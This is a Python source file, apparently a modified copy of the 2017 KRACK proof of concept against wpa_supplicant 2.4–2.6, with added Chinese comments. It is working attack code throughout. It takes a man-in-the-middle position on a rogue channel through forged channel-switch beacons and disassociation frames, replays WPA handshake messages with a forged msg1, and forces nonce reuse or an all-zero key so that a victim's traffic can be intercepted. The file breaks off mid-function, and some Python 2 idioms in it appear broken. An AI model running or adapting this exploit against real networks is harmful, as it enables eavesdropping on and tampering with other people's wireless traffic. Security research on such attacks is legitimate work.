#!/usr/bin/env python3

# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, textwrap
from datetime import datetime
from wpaspy import Ctrl

IEEE_TLV_TYPE_SSID    = 0
IEEE_TLV_TYPE_CHANNEL = 3
IEEE_TLV_TYPE_RSN     = 48
IEEE_TLV_TYPE_CSA     = 37
IEEE_TLV_TYPE_VENDOR  = 221

IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

#### Basic output and logging functionality ####

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }

global_log_level = INFO
def log(level, msg, color=None, showtime=True):
	if level < global_log_level: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print((datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m")

#### Man-in-the-middle Code ####
class MitmSocket(L2Socket):
	def __init__(self, dumpfile=None, strict_echo_test=False, **kwargs):
		super(MitmSocket, self).__init__(**kwargs)
		self.pcap = None
		if dumpfile:
			self.pcap = PcapWriter("%s.%s.pcap" % (dumpfile, self.iface), append=False, sync=True)
		self.strict_echo_test = strict_echo_test

	def set_channel(self, channel):
		subprocess.check_output(["iw", self.iface, "set", "channel", str(channel)])

	def send(self, p):
		# 所有送出去的封包都要加 radiotap
		p[Dot11].FCfield |= 0x20
		L2Socket.send(self, RadioTap()/p)
		if self.pcap: self.pcap.write(RadioTap()/p)
		log(DEBUG, "%s: Injected frame %s" % (self.iface, dot11_to_str(p)))

	def _strip_fcs(self, p):
		# radiotap header flags 0x00...0: no used FCS failed
		# .present is flagsfield
		if p[RadioTap].present & 2 != 0:
			rawframe = bytes(p[RadioTap])
			pos = 8 # FCS 在 frame 開頭後第 9 bytes 的地方
			while rawframe[pos - 1] & 0x80 != 0: pos += 4
			# If the TSFT field is present, it must be 8-bytes aligned
			if p[RadioTap].present & 1 != 0:
				pos += (8 - (pos % 8))
				pos += 8
			# radiotap flag & 0x10
			if rawframe[pos] & 0x10 != 0:
				# FCS 在 frame 的最後 4 bytes
				return Dot11(bytes(p[Dot11])[:-4])
		return p[Dot11]

	def recv(self, x=MTU):
		p = L2Socket.recv(self, x)
		if p == None: 
			return None
		if p.getlayer(Dot11) == None:
			return None
		
		if self.pcap: self.pcap.write(p)
		# Don't care about control frames
		if p.type == 1:
			log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
			return None

		# 1. Radiotap monitor mode header is defined in ieee80211_add_tx_radiotap_header: TX_FLAGS, DATA_RETRIES, [RATE, MCS, VHT, ]
		# 2. Radiotap header for normal received frames is defined in ieee80211_add_rx_radiotap_header: FLAGS, CHANNEL, RX_FLAGS, [...]
		# 3. Beacons generated by hostapd and recieved on virtual interface: TX_FLAGS, DATA_RETRIES
		#
		# Conclusion: if channel flag is not present, but rate flag is included, then this could be an echoed injected frame.
		# Warning: this check fails to detect injected frames captured by the other interface (due to proximity of transmittors and capture effect)
		radiotap_possible_injection = (p[RadioTap].present & IEEE80211_RADIOTAP_CHANNEL == 0) and not (p[RadioTap].present & IEEE80211_RADIOTAP_RATE == 0)

		# Hack: ignore frames that we just injected and are echoed back by the kernel. Note that the More Data flag also
		#	allows us to detect cross-channel frames (received due to proximity of transmissors on different channel)
		if p[Dot11].FCfield & 0x20 != 0 and (not self.strict_echo_test or radiotap_possible_injection):
			log(DEBUG, "%s: ignoring echoed frame %s (0x%02d, present=%08d, strict=%d)" % (self.iface, dot11_to_str(p), p[Dot11].FCfield, p[RadioTap].present, radiotap_possible_injection))
			return None
		else:
			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
		result = self._strip_fcs(p)
		return result

	def close(self):
		if self.pcap: self.pcap.close()
		super(MitmSocket, self).close()

def call_macchanger(iface, macaddr):
	try:
		subprocess.check_output(["macchanger", "-m", macaddr, iface])
	except subprocess.CalledProcessError as err:
		if not "It's the same MAC!!" in err.output.decode():
			print(err.output.decode())
			raise

def set_mac_address(iface, macaddr):
	subprocess.check_output(["ifconfig", iface, "down"])
	call_macchanger(iface, macaddr)
	subprocess.check_output(["ifconfig", iface, "up"])

#### Packet Processing Functions ####

def xorstr(lhs, rhs):
	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])

def dot11_get_seqnum(p):
	# .... .... .... (....)對齊用
	return p[Dot11].SC >> 4

def dot11_get_iv(p):
	if not p.haslayer(Dot11WEP):
		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
		return 0
	wep = p[Dot11WEP]
	if wep.keyid & 32:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
	else:
		return int.from_bytes(wep.iv, 'little')


# !--
def dot11_get_tid(p):
	if p.haslayer(Dot11QoS):
		return ord(bytes(p[Dot11QoS])[0]) & 0x0F
	return 0

def dot11_is_group(p):
	return p.addr1 == "ff:ff:ff:ff:ff:ff"

def get_eapol_msgnum(p):
	# key information 對應位置
	FLAG_PAIRWISE = 0b0000001000
	FLAG_ACK      = 0b0010000000
	FLAG_SECURE   = 0b1000000000

	if not p.haslayer(EAPOL): return 0
	keyinfo = bytes(p[EAPOL])[5:7]
	flags = struct.unpack(">H", keyinfo)[0]
	# pairwise 都是 1
	if flags & FLAG_PAIRWISE:
		# ACK 為 1，sent by server
		if flags & FLAG_ACK:
			# 如果有加密，則為 msg3
			if flags & FLAG_SECURE: return 3
			else: return 1
		# ACK 為 0，sent by client
		else:
			keydatalen = struct.unpack(">H", bytes(p[EAPOL].load[93:95]))[0]
			# msg4 不會有任何 data
			if keydatalen == 0: return 4
			else: return 2
	return 0

def get_eapol_replaynum(p):
	return struct.unpack(">Q", p[EAPOL].load[5:13])[0]

def set_eapol_replaynum(p, value):
	p[EAPOL].load = p[EAPOL].load[:5] + struct.pack(">Q", value) + p[EAPOL].load[13:]
	return p

def dot11_to_str(p):
	EAP_CODE = {1: "Request"}
	EAP_TYPE = {1: "Identity"}
	DEAUTH_REASON = {1: "Unspecified", 2: "Prev_Auth_No_Longer_Valid/Timeout", 3: "STA_is_leaving", 4: "Inactivity", 6: "Unexp_Class2_Frame",
		7: "Unexp_Class3_Frame", 8: "Leaving", 15: "4-way_HS_timeout"}
	dict_or_str = lambda d, v: d.get(v, str(v))
	if p.type == 0:
		if p.haslayer(Dot11Beacon):     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
		if p.haslayer(Dot11ProbeReq):   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11ProbeResp):  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11Auth):       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
		if p.haslayer(Dot11Deauth):     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
		if p.haslayer(Dot11AssoReq):    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11ReassoReq):  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11AssoResp):   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
		if p.haslayer(Dot11ReassoResp): return "ReassoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11ReassoResp].status)
		if p.haslayer(Dot11Disas):      return "Disas(seq=%d)" % dot11_get_seqnum(p)
		if p.subtype == 13:      return "Action(seq=%d)" % dot11_get_seqnum(p)
	elif p.type == 1:
		if p.subtype ==  9:      return "BlockAck"
		if p.subtype == 11:      return "RTS"
		if p.subtype == 13:      return "Ack"
	elif p.type == 2:
		if p.haslayer(Dot11WEP): return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
		if p.haslayer(EAPOL):
			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
			elif p.haslayer(EAP):return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
			else:                return repr(p)
		if p.haslayer(Dot11CCMP): return "EncryptedData(seq=%d)" % dot11_get_seqnum(p)
	return repr(p)			

def construct_csa(channel, count=1):
	switch_mode = 1			# STA should not Tx untill switch is completed
	new_chan_num = channel	# Channel it should switch to
	switch_count = count	# Immediately make the station switch
	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)

def append_csa(p, channel, count=1):
	p = p.copy()
	el = p[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload
	prevel.payload = construct_csa(channel, count)
	return p

# 取得 beacon frame 的 ssid func.
def get_tlv_value(p, typee):
	if not p.haslayer(Dot11Elt): return None
	el = p[Dot11Elt]
	while isinstance(el, Dot11Elt):
		if el.ID == typee:
			return el.info.decode()
		el = el.payload
	return None

# 印出 func.
def print_rx(level, name, p, color=None, suffix=None):
	if p[Dot11].type == 1: return
	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)

# 紀錄網路的 config
class NetworkConfig():
	def __init__(self):
		self.ssid = None
		self.real_channel = None
		self.group_cipher = None
		self.wpavers = 0
		self.pairwise_ciphers = set()
		self.akms = set()
		self.wmmenabled = 0
		self.capab = 0
		
	# 檢查 beacon frame MAC層是否包含RSNE訊息，沒有就代表非使用RSN網路(為WEP)
	def is_wparsn(self):
		return not self.group_cipher is None and self.wpavers > 0 and \
			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0

	# 解析 RSN 內容
	def parse_wparsn(self, wparsn):
		# 群組加密演算法
		self.group_cipher = ord(wparsn.decode('unicode_escape')[5])
		# 處理 c 語言的struct, H: unsigned short return python integer; <: little-endian
		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
		pos = wparsn[8:]
		for i in range(num_pairwise):
			self.pairwise_ciphers.add(ord(pos.decode('unicode_escape')[3]))
			pos = pos[4:]
		# 取出 akm 數量, (authentication and key management, akm)
		num_akm = struct.unpack("<H", pos[:2])[0]
		# 取出 akm suite list
		pos = pos[2:]
		for i in range(num_akm):
			self.akms.add(ord(pos.decode('unicode_escape')[3]))
			pos = pos[4:]
		# RSN capabilities
		if len(pos) >= 2:
			self.capab = struct.unpack("<H", pos[:2])[0]

	def from_beacon(self, p):
		el = p[Dot11Elt]
		while isinstance(el, Dot11Elt):
			if el.ID == IEEE_TLV_TYPE_SSID:
				self.ssid = el.info.decode('unicode_escape')
			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
				self.real_channel = ord(el.info.decode('unicode_escape')[0])
			elif el.ID == IEEE_TLV_TYPE_RSN:
				# 有 RSN Info 為 WPA2
				self.parse_wparsn(el.info)
				self.wpavers |= 2
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x01":
				# Micrsoft OUI: 00 50 f2; OUI Type: 01 (WPA)
				self.parse_wparsn(el.info[4:])
				self.wpavers |= 1
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x02":
				# Micrsoft OUI: 00 50 f2; OUI Type: 02 (WPA)
				self.wmmenabled = 1

			el = el.payload

	def find_rogue_channel(self):
		# 強盜 AP 頻道不是在 1 就是 11
		self.rogue_channel = 1 if self.real_channel >= 6 else 11
	
	# hostapd.confg寫檔 
	def write_config(self, iface):
		TEMPLATE = """
ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
ctrl_interface_group=root

interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}
rsn_ptksa_counters={ptksa_counters}
rsn_gtksa_counters={gtksa_counters}

wmm_enabled={wmmenabled}
wmm_advertised={wmmadvertised}
hw_mode=g
auth_algs=3
wpa_passphrase={password}"""
		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
		ciphers2str = {2: "TKIP", 4: "CCMP"}
		return TEMPLATE.format(
			iface = iface,
			ssid = self.ssid,
			channel = self.rogue_channel,
			wpaver = self.wpavers,
			akms = " ".join([akm2str[idx] for idx in self.akms]),
			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
			ptksa_counters = (self.capab & 0b001100) >> 2,
			gtksa_counters = (self.capab & 0b110000) >> 4,
			wmmadvertised = int(args.group),
			wmmenabled = self.wmmenabled,
			password = str(args.password))

class ClientState():
	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)

	def __init__(self, macaddr):
		self.macaddr = macaddr
		self.reset()

	def reset(self):
		self.state = ClientState.Initializing
		self.keystreams = dict()
		self.attack_max_iv = None
		self.attack_time = None

		self.assocreq = None
		self.msg1 = None
		self.msg3s = []
		self.msg4 = None
		self.krack_finished = False

	def store_msg1(self, msg1):
		self.msg1 = msg1

	def add_if_new_msg3(self, msg3):
		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
			return
		self.msg3s.append(msg3)

	def update_state(self, state):
		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
		self.state = state

	def mark_got_mitm(self):
		if self.state <= ClientState.Connecting:
			self.state = ClientState.GotMitm
			log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
				color="green", showtime=False)

	def is_state(self, state):
		return self.state == state

	def should_forward(self, p):
		if args.group:
			# Forwarding rules when attacking the group handshake
			return True
		else:
			# Forwarding rules when attacking the 4-way handshake
			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
				# 四次交握不轉送 msg2 & msg4
				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
			return self.state in [ClientState.Success_Reinstalled]

	def save_iv_keystream(self, iv, keystream):
		self.keystreams[iv] = keystream

	def get_keystream(self, iv):
		return self.keystreams[iv]

	def attack_start(self):
		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
		self.attack_time = time.time()
		self.update_state(ClientState.Attack_Started)

	def is_iv_reused(self, iv):
		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams

	def attack_timeout(self, iv):
		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv

class KRAckAttack():
	def __init__(self, nic_real_mon, nic_real_clientack, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
		self.nic_real_mon = nic_real_mon
		self.nic_real_clientack = nic_real_clientack
		self.nic_rogue_ap = nic_rogue_ap
		self.nic_rogue_mon = nic_rogue_mon
		self.dumpfile = dumpfile
		self.ssid = ssid
		self.beacon = None
		self.apmac = None
		self.netconfig = None
		self.hostapd = None

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()

		self.sock_real  = None
		self.sock_rogue = None
		self.clients = dict()
		self.disas_queue = []
		self.continuous_csa = cont_csa
		# 用來監控介面是否在適當的頻道中
		self.last_real_beacon = None
		self.last_rogue_beacon = None
		# 用來攻擊/測試 group key handshake
		self.group1 = []
		self.time_forward_group1 = None

	def hostapd_rx_mgmt(self, p):
		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

	def hostapd_add_sta(self, macaddr):
		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))

	def hostapd_finish_4way(self, stamac):
		log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)

	def find_beacon(self, ssid):
		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # opened_socket=self.sock_real iface=self.nic_real_mon
		if ps is None or len(ps) < 1:
			log(STATUS, "Searching for target network on other channels")
			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
				self.sock_real.set_channel(chan)
				log(DEBUG, "Listening on channel %d" % chan)
				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # , opened_socket=self.sock_real
				if ps and len(ps) >= 1: break
		if ps and len(ps) >= 1:
			actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
			self.sock_real.set_channel(actual_chan)
			self.beacon = ps[0]
			self.apmac = self.beacon.addr2

	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
		newchannel = self.netconfig.rogue_channel
		beacon = self.beacon.copy()
		if target: beacon.addr1 = target

		for i in range(numbeacons):
			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
			# followed by one with a value of 1. When starting with 1 it errors out.
			csabeacon = append_csa(beacon, newchannel, 2)
			self.sock_real.send(csabeacon)

			csabeacon = append_csa(beacon, newchannel, 1)
			self.sock_real.send(csabeacon)

		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")

	def send_disas(self, macaddr):
		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
		self.sock_rogue.send(p)
		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")

	def queue_disas(self, macaddr):
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))

	def try_channel_switch(self, macaddr):
		self.send_csa_beacon()
		self.queue_disas(macaddr)

	def hostapd_add_allzero_client(self, client):
		if client.assocreq is None:
			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
			return False
		# 1. Add the client to hostapd
		self.hostapd_add_sta(client.macaddr)
		# 2. Inform hostapd of the encryption algorithm and options the client uses
		self.hostapd_rx_mgmt(client.assocreq)
		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
		self.hostapd_finish_4way(client.macaddr)
		return True

	def handle_to_client_pairwise(self, client, p):
		if args.group: return False

		eapolnum = get_eapol_msgnum(p)
		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			log(DEBUG, "Storing msg1")
			client.store_msg1(p)
		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			client.add_if_new_msg3(p)
			# !-- FIXME: timeout on the client side
			if len(client.msg3s) >= 2:
				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
				packet_list = client.msg3s
				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
				packet_list.insert(1, p)
				for p in packet_list: self.sock_rogue.send(p)
				client.msg3s = []
				client.attack_start()
			else:
				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)

			return True

		return False

	def handle_from_client_pairwise(self, client, p):
		if args.group: return

		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
		plaintext = "\xaa\xaa\x03\x00\x00\x00"
		print('Debug: ', end='') # !--
		print(p[Dot11WEP].wepdata)
		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
		keystream = xorstr(plaintext, encrypted)

		iv = dot11_get_iv(p)
		if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)

		# FIXME:
		# - The reused IV could be one we accidently missed due to high traffic!!!
		if client.is_iv_reused(iv):
			# If the same keystream is reused, we have a normal key reinstallation attack
			if keystream == client.get_keystream(iv):
				log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
				client.update_state(ClientState.Success_Reinstalled)
				self.sock_real.send(client.msg4)

			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
			else:
				# TODO: We can explicitly try to decrypt it using an all-zero key
				log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
				log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)

				self.hostapd_add_allzero_client(client)

				# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
				client.update_state(ClientState.Success_AllzeroKey)

		elif client.attack_timeout(iv):
			log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
			client.update_state(ClientState.Failed)

		client.save_iv_keystream(iv, keystream)

	def handle_to_client_groupkey(self, client, p):
		if not args.group: return False

		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
		if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
			# TODO: Detect that it's not a retransmission
			self.group1.append(p)
			log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
			if len(self.group1) == 2:
				log(STATUS, "Forwarding first group1 message", showtime=False)
				self.sock_rogue.send(self.group1.pop(0))

				self.time_forward_group1 = time.time() + 3

			return True
		return False

	def handle_from_client_groupkey(self, client, p):
		if not args.group: return
	
		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
			log(STATUS, "Got a likely group message 2", showtime=False)

	def handle_rx_realchan(self):
		p = self.sock_real.recv()
		if p == None: 
			return

		# 1. Handle frames sent TO the real AP
		if p.addr1 == self.apmac:
			# If it's an authentication to the real AP, always display it ...
			if p.haslayer(Dot11Auth):
				print_rx(INFO, "Real channel ", p, color="orange")

				# ... with an extra clear warning when we wanted to MitM this specific client
				if self.clientmac == p.addr2:
					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

				if p.addr2 in self.clients: del self.clients[p.addr2]
				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
				self.send_csa_beacon(target=p.addr2)
				self.send_csa_beacon()
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].update_state(ClientState.Connecting)

			# Remember association request to save connection parameters
			elif p.haslayer(Dot11AssoReq):
				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p

			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
				if p.addr2 in self.clients: del self.clients[p.addr2]

			# For all other frames, only display them if they come from the targeted client
			elif self.clientmac is not None and self.clientmac == p.addr2:
				print_rx(INFO, "Real channel ", p)

			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))

		# 2. 處理來自原本 AP 的 frames
		elif p.addr2 == self.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
				self.last_real_beacon = time.time()

			# 決定要不要轉送封包
			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))

			# 需要特別注意 Deauth and Disassoc frames
			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			# print 所有轉送的封包
			elif self.clientmac is not None and self.clientmac == p.addr1:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			elif might_forward:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")

			if might_forward:
				if p.addr1 in self.clients:
					client = self.clients[p.addr1]
					# !-- CHECK[y]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
					# !-- CHECK[ ]: time out problem?
					if self.handle_to_client_pairwise(client, p):
						pass
					elif self.handle_to_client_groupkey(client, p):
						pass
					elif p.haslayer(Dot11Deauth):
						del self.clients[p.addr1]
						self.sock_rogue.send(p)
					else:
						self.sock_rogue.send(p)
				# Group addressed frames
				else:
					self.sock_rogue.send(p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Real channel ", p)

	def handle_rx_roguechan(self):
		p = self.sock_rogue.recv()
		if p == None: return

		# 1. 處理來自強盜 AP 的 frames
		if p.addr2 == self.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
				self.last_rogue_beacon = time.time()
			# Display all frames sent to the targeted client
			if self.clientmac is not None and p.addr1 == self.clientmac:
				print_rx(INFO, "Rogue channel", p)

		# 2. Handle frames sent TO the AP
		elif p.addr1 == self.apmac:
			client = None

			# Check if it's a new client that we can MitM
			if p.haslayer(Dot11Auth):
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].mark_got_mitm()
				client = self.clients[p.addr2]
				will_forward = True
			# Otherwise check of it's an existing client we are tracking/MitM'ing
			elif p.addr2 in self.clients:
				client = self.clients[p.addr2]
				will_forward = client.should_forward(p)
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
			# Always display all frames sent by the targeted client
			elif p.addr2 == self.clientmac:
				print_rx(INFO, "Rogue channel", p)

			# If this now belongs to a client we want to track, process the packet further
			if client is not None:
				# Save the association request so we can track the encryption algorithm and options the client uses
				if p.haslayer(Dot11AssoReq): client.assocreq = p
				# Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
				if get_eapol_msgnum(p) == 4: client.msg4 = p

				# Client is sending on rogue channel, we got a MitM position =)
				client.mark_got_mitm()

				if p.haslayer(Dot11WEP):
					# Use encrypted frames to determine if the key reinstallation attack succeeded
					# 檢查 KRACK攻擊有沒有成功，
					self.handle_from_client_pairwise(client, p)
					self.handle_from_client_groupkey(client, p)

				if will_forward:
					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
					if client.state < ClientState.Attack_Started:
						p.FCfield &= 0xFFEF

					self.sock_real.send(p)


		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Rogue channel", p)

	def handle_hostapd_out(self):
		# hostapd always prints lines so this should not block
		line = self.hostapd.stdout.readline()
		if line == "":
			log(ERROR, "Rogue hostapd instances unexpectedly closed")
			quit(1)

		if line.startswith(">>>> ".encode()):
			log(STATUS, "Rogue hostapd: " + line[5:].strip().decode())
		elif line.startswith(">>> ".encode()):
			log(DEBUG, "Rogue hostapd: " + line[4:].strip().decode())
		# This is a bit hacky but very usefull for quick debugging
		elif "fc=0xc0".encode() in line:
			log(WARNING, "Rogue hostapd: " + line.strip().decode())
		elif "sta_remove".encode() in line or "Add STA".encode() in line or "disassoc cb".encode() in line or "disassocation: STA".encode() in line:
			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
		else:
			log(ALL, "Rogue hostapd: " + line.strip().decode())

	def configure_interfaces(self):
		# 0. Warn about common mistakes
		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
